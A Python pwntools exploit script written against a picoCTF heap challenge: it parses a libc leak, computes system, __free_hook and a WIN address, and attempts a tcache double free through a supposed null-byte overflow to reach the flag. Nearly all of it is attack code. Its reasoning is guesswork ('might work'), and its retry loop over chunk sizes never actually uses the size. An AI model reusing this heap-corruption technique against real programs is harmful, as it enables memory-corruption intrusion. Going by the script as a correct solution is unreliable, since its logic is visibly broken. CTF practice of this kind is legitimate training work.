#!/usr/bin/env python3

from pwn import *

HOST = 'jupiter.challenges.picoctf.org'
PORT = 29476

context.log_level = 'info'
context.arch = 'amd64'

def exploit():
    p = remote(HOST, PORT)
    
    # Dialog
    p.recvuntil(b'So, you want to be a hero?')
    p.sendline(b'y')
    
    # Get leak
    data = p.recvuntil(b'>')
    leak = int(data.split(b'Take this: ')[1].split(b'\n')[0], 16)
    log.info(f"Leak: 0x{leak:x}")
    
    libc_base = leak - 0x21fd0
    log.info(f"Libc base: 0x{libc_base:x}")
    
    # Calculate addresses
    system = libc_base + 0x4f4e0
    free_hook = libc_base + 0x1e75a8
    WIN = 0x400a02
    
    # In libc 2.29, tcache has a key field to prevent double free
    # But the null byte overflow can corrupt this key!
    
    # Allocate chunks
    # We need size that when null byte overwrites, creates interesting behavior
    
    # Allocate 3 chunks
    for i in range(3):
        p.sendline(b'1')
        p.recvuntil(b'length')
        p.sendline(b'104')  # 0x68
        p.recvuntil(b'description')
        p.sendline(chr(65+i).encode() * 104)
        p.recvuntil(b'>')
        log.info(f"Allocated chunk {i}")
    
    # The null byte from chunk 0 has overwritten something in chunk 1
    # This might have corrupted the tcache key field
    
    # Free chunk 1
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'1')
    p.recvuntil(b'>')
    
    # Free chunk 0
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'0')
    p.recvuntil(b'>')
    
    # Try to free chunk 0 again (double free)
    # This might work if the key was corrupted
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'0')
    
    response = p.recv(100, timeout=1)
    log.info(f"After double free attempt: {response}")
    
    # If we got here without crash, we might have double free
    # Allocate with controlled fd
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'104')
    p.recvuntil(b'description')
    
    # Try to write WIN function address somewhere
    payload = p64(WIN) * 13
    p.send(payload)
    p.recvuntil(b'>')
    
    # Allocate more
    p.sendline(b'1')
    p.recvuntil(b'length')
    p.sendline(b'104')
    p.recvuntil(b'description')
    p.sendline(b'E' * 104)
    p.recvuntil(b'>')
    
    # Try to trigger
    p.sendline(b'2')
    p.recvuntil(b'remove')
    p.sendline(b'3')
    
    # Check for flag
    try:
        output = p.recvall(timeout=2)
        if b'picoCTF' in output:
            start = output.index(b'picoCTF')
            end = output.index(b'}', start) + 1
            log.success(f"FLAG: {output[start:end].decode()}")
            return True
        else:
            log.info(f"No flag in output")
    except:
        pass
    
    p.close()
    return False

# Try multiple times with different sizes
sizes = [24, 32, 48, 56, 64, 72, 88, 96, 104, 112, 120, 128, 200, 248]

for size in sizes:
    log.info(f"Trying with size {size}")
    try:
        if exploit():
            break
    except:
        continue